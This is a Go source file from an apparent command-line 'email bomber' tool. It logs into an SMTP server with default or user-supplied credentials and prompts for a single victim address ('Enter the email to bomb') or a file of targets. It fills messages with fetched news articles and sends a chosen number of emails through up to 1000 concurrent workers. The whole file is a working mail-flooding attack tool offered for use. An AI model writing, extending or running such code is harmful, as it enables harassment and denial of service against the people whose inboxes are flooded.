package bomber

import (
	"bufio"
	"fmt"
	"go_cli/fileutil"
	"os"
	"strconv"
	"strings"
	"sync"

	"github.com/fatih/color"
	"github.com/ncruces/zenity"
	"github.com/schollz/progressbar/v3"
	"gopkg.in/gomail.v2"
)

type SmtpOpts struct {
	Host     string
	Port     string
	Username string
	Password string
	Default  bool
}

func Bomber() {
	var smtpCreds SmtpOpts
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("want to use a default SMTP provided by the tool? Y/n :> ")
	rawSmtpChoice, _ := reader.ReadString('\n')
	trimmedSmtpChoice := strings.ToLower(strings.TrimSpace(rawSmtpChoice))
	if strings.Contains(trimmedSmtpChoice, "y") {
		smtpCreds = SmtpOpts{
			Host:     os.Getenv("SMTP_HOST"),
			Port:     os.Getenv("SMTP_PORT"),
			Username: os.Getenv("SMTP_USERNAME"),
			Password: os.Getenv("SMTP_PASSWORD"),
			Default:  true,
		}
	} else {
		var filteredCreds []string
		fmt.Println("Enter your SMTP Credentials. Format >  HOST,PORT,USERNAME,PASSWORD")
		fmt.Print(">>> ")
		rawSmtpCreds, _ := reader.ReadString('\n')
		splitedCreds := strings.Split(rawSmtpCreds, ",")
		for _, creds := range splitedCreds {
			trimmedCreds := strings.TrimSpace(creds)
			if len(trimmedCreds) != 0 {
				filteredCreds = append(filteredCreds, trimmedCreds)
			}
		}
		smtpCreds.Host = filteredCreds[0]
		smtpCreds.Port = filteredCreds[1]
		smtpCreds.Username = filteredCreds[2]
		smtpCreds.Password = filteredCreds[3]
		smtpCreds.Default = false
	}
	fmt.Println("verifying SMTP Credentials...")
	port, _ := strconv.Atoi(smtpCreds.Port)
	dialer := gomail.NewDialer(smtpCreds.Host, port, smtpCreds.Username, smtpCreds.Password)
	smtpConn, err := dialer.Dial()
	if err != nil {
		if smtpCreds.Default {
			fmt.Printf("err: %v\n", err)
			fmt.Printf("smtpCreds: %v\n", smtpCreds)
			fmt.Println("The default SMTP Credentials is dead. Please use a custom SMTP.")
		} else {
			fmt.Printf("err: %v\n", err)
		}
		return
	}
	defer smtpConn.Close()

	fmt.Print("is your target more than 1? Y/n :> ")
	rawNumTarget, _ := reader.ReadString('\n')
	numTarget := strings.ToLower(strings.TrimSpace(rawNumTarget))
	var targetEmail string
	var targetList []string
	if strings.Contains(numTarget, "y") {
		fmt.Println("Select your target list: ")
		filePath, err := zenity.SelectFile(
			zenity.FileFilters{
				{Patterns: []string{"*.txt"}, CaseFold: false},
			})
		if err != nil {
			fmt.Printf("err: %v\n", err)
			return
		}
		targetList, err = fileutil.ReadFromFile(filePath)
		if err != nil {
			fmt.Printf("err: %v\n", err)
			return
		}
	} else {
		fmt.Print("Enter the email to bomb :> ")
		fmt.Scanln(&targetEmail)
	}
	fmt.Print("Enter number of emails to send :> ")
	numEmails, _ := reader.ReadString('\n')
	numEmails = strings.TrimSpace(numEmails)
	numBombs, _ := strconv.Atoi(numEmails)

	maxWorkers := 1000
	var wg sync.WaitGroup
	var mutex sync.Mutex
	msgOpts := gomail.NewMessage()

	successBar := progressbar.NewOptions(numBombs,
		progressbar.OptionSetWriter(os.Stdout),
		progressbar.OptionShowCount(),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionSetDescription("Sent ->"),
		progressbar.OptionSetTheme(progressbar.Theme{
			Saucer:        "[green]=[reset]",
			SaucerHead:    "[green]>[reset]",
			SaucerPadding: " ",
			BarStart:      "[",
			BarEnd:        "]",
		}),
	)

	fmt.Println("fetching news data...")
	body, err := GetMsgContent()
	if err != nil {
		fmt.Printf("err: %v\n", err)
		return
	}

	if body.TotalResults > 0 {
		color.New(color.FgGreen).Println("Fetch was successful.")
	} else {
		color.New(color.FgRed).Println("The api has reached it's limit.\nKindly visit newsapi.org to register a new account.\nGet the api key and restart the tool with the given api key.")
		return
	}

	if len(targetList) == 0 {
		msgOpts.SetHeader("To", targetEmail)
		chunkSize := numBombs / maxWorkers

		if numBombs%maxWorkers != 0 {
			chunkSize++
		}

		workingChan := make(chan []int, chunkSize)
		articleChunks := make(chan Article, 1)
		distSlice := make([]int, numBombs)
		for i := 0; i < numBombs; i++ {
			distSlice[i] = i
		}

		for i := 0; i < maxWorkers; i++ {
			wg.Add(1)
			go SingleBomb(articleChunks, workingChan, &wg, &mutex, &smtpConn, msgOpts, &smtpCreds, successBar)
		}

		articles := body.Articles
		for _, article := range articles {
			articleChunks <- article
		}
		close(articleChunks)

		for i := 0; i < numBombs; i += chunkSize {
			end := i + chunkSize
			if end > numBombs {
				end = numBombs
			}
			workingChan <- distSlice[i:end]
		}
		close(workingChan)
	} else {
		chunkSize := len(targetList) / maxWorkers

		if len(targetList)%maxWorkers != 0 {
			chunkSize++
		}

		emailChunks := make(chan []string, chunkSize)
		articleChunks := make(chan Article, 1)

		for i := 0; i < maxWorkers; i++ {
			wg.Add(1)
			go MultiTargetBomb(articleChunks, emailChunks, &wg, &mutex, &smtpConn, msgOpts, &smtpCreds, numBombs)
		}

		for i := 0; i < len(targetList); i += chunkSize {
			end := i + chunkSize
			if end > len(targetList) {
				end = len(targetList)
			}
			emailChunks <- targetList[i:end]
		}
		close(emailChunks)

		articles := body.Articles
		go func() {
			process := true
			for process {
				select {
				case _, ok := <-articleChunks:
					if !ok {
						process = false
					}
				default:
					for _, article := range articles {
						articleChunks <- article
					}
				}
			}
		}()

		wg.Wait()
		close(articleChunks)
		fmt.Println("\nall done!")
		os.Exit(0)
	}

}
